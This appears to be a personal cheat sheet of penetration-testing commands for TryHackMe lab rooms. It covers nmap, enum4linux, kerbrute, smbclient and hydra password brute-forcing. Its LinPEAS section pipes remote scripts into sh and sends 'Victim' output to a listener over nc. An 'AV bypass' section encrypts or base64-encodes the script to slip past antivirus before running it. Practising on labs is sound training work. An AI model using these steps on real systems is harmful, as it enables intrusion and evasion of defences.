## Basic notes for TryHackMe.com rooms and training.

Explain shell has been great for learning.
https://explainshell.com/

paste an example of a command and it will tell you what the switches mean. Very handy.

### Enumeration Tools

## Nmap
https://nmap.org/

#### Cheatsheet
https://highon.coffee/blog/nmap-cheat-sheet/

Scan hosts and ports

basic examples

```nmap $IP -vvv -Pn -sC -sV -oN nmap-output.txt```

narrow it down to open ports.

```nmap $IP -vvv -p 135,139,445,88,3389 -sC -sV -oN nmap-script-scan.txt```

## enum4linux
https://github.com/CiscoCXSecurity/enum4linux

#### Cheatsheet
https://highon.coffee/blog/enum4linux-cheat-sheet/

#### basic examples

```num4linux -a $IP```

## Kerbrute
https://github.com/ropnop/kerbrute

#### Cheatsheet
https://cheatsheet.haax.fr/windows-systems/exploitation/kerberos/

```./kerbrute userenum --dc 10.10.XX.XX -d spookysec.local userlist.txt```

## SMBClient

#### Cheatsheet
https://github.com/irgoncalves/smbclient_cheatsheet

list shares

```smbclient -L $IP -U '$USERNAME'```

connect to a share

```smbclient //$IP/$PATH -U '$USERNAME'```

## Hydra - password crack

Used in a few tryhackme rooms. 

basic example for ssh

```hydra -l jan -P /usr/share/wordlists/rockyou.txt $IP ssh'```

# LinPeas
https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS

## Quick Start

Find the latest versions of all the scripts and binaries in the releases page.

From github
```
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

Local network
```
sudo python -m SimpleHTTPServer 80 #Host
curl 10.10.10.10/linpeas.sh | sh #Victim
```
Without curl
```
sudo nc -q 5 -lvnp 80 < linpeas.sh #Host
cat < /dev/tcp/10.10.10.10/80 | sh #Victim
```
Excute from memory and send output back to the host
```
nc -lvnp 9002 | tee linpeas.out #Host
curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002 #Victim
```
Output to file
```
./linpeas.sh -a > /dev/shm/linpeas.txt #Victim
less -r /dev/shm/linpeas.txt #Read with colors
```
Use a linpeas binary
```
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas_linux_amd64
chmod +x linpeas_linux_amd64
./linpeas_linux_amd64
```
## AV bypass

open-ssl encryption
```
openssl enc -aes-256-cbc -pbkdf2 -salt -pass pass:AVBypassWithAES -in linpeas.sh -out lp.enc
sudo python -m SimpleHTTPServer 80 #Start HTTP server
curl 10.10.10.10/lp.enc | openssl enc -aes-256-cbc -pbkdf2 -d -pass pass:AVBypassWithAES | sh #Download from the victim
```
Base64 encoded
```
base64 -w0 linpeas.sh > lp.enc
sudo python -m SimpleHTTPServer 80 #Start HTTP server
curl 10.10.10.10/lp.enc | base64 -d | sh #Download from the victim
```
